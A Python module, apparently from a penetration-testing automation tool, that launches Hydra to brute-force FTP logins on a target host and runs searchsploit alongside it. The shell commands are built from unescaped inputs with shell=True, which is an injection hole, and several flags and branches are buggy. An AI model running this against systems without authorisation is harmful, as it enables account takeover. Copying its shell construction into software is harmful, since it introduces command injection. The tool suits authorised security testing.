import os
import subprocess
from colorama import Fore, Back, Style
from concurrent.futures import ThreadPoolExecutor
from modules.searchsploit import searchsploit
from modules.nmap_vuln import nmap_vuln


def hydra_brute(host, protocol, port, output_dir, username_list, password_list): # define user and password lists
    try: # logic to handle file vs folder arguments

        if os.path.isfile(username_list) and os.path.isfile(password_list): # both are dir paths to credential file
            subprocess.Popen([f"hydra -t 4-V -f -L {username_list} -P {password_list} ftp://{host} -s {port} > {output_dir}/results/{host}/{protocol}/{port}/ftp_brute_force.txt"], shell=True) 
        if os.path.isfile(username_list) and os.path.isfile(password_list) == False: # username is dir, pass is string
            subprocess.Popen([f"hydra -t 4-V -f -L {username_list} -p {password_list} ftp://{host} -s {port} > {output_dir}/results/{host}/{protocol}/{port}/ftp_brute_force.txt"], shell=True) 
        if os.path.isfile(username_list) == False and os.path.isfile(password_list): # username is string, pass is dir
            subprocess.Popen([f"hydra -t 4-V -f -l {username_list} -P {password_list} ftp://{host} -s {port} > {output_dir}/results/{host}/{protocol}/{port}/ftp_brute_force.txt"], shell=True) 
        else:                                                                   # both are strings
            subprocess.Popen([f"hydra -t 4-V -f -l {username_list} -p {password_list} ftp://{host} -s {port} > {output_dir}/results/{host}/{protocol}/{port}/ftp_brute_force.txt"], shell=True) 

    except Exception as e:
        print(f"Error in hydra_brute function: {e}")

    finally: # does not seem to be working
        with open (f"{output_dir}/results/{host}/{protocol}/{port}/ftp_brute_force.txt") as file:
            for line in file:
                print("hydra_brute test") # test line, remove later
                if '(valid pair found)' in line:
                    print(Fore.GREEN + Back.BLACK + Style.BRIGHT + f"[+++] Valid FTP credentials found on {host}:{port}. See results at: {output_dir}/results/{host}/{protocol}/{port}/ftp_brute_force.txt." + Style.RESET_ALL)
                    break # or pass?
                else:
                    pass

def all_ftp(host, protocol, port, output_dir, product, username_list, password_list):
    with ThreadPoolExecutor() as executor:
        executor.submit(searchsploit, host, protocol, port, output_dir, product)
        #executor.submit(nmap_vuln, host, protocol, port, output_dir)
        executor.submit(hydra_brute, host, protocol, port, output_dir, username_list, password_list)

        



